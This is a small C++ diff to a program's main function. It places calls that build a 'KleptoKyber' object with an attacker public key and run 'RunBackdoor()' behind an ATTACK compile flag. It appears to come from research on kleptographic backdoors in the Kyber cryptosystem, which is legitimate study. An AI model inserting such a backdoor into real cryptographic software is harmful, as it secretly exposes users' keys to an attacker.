@@ -26,8 +26,10 @@ int main(int argc, char const *argv[]) {
   // }
   // ProgramInterface program_interface(args);
   // program_interface.run();
+  #ifdef ATTACK
   KleptoKyber klepto_kyber(512, attacker_pk);
   klepto_kyber.RunBackdoor();
   std::cout << "Hello, World!" << std::endl;
+  #endif
   return 0;
 }
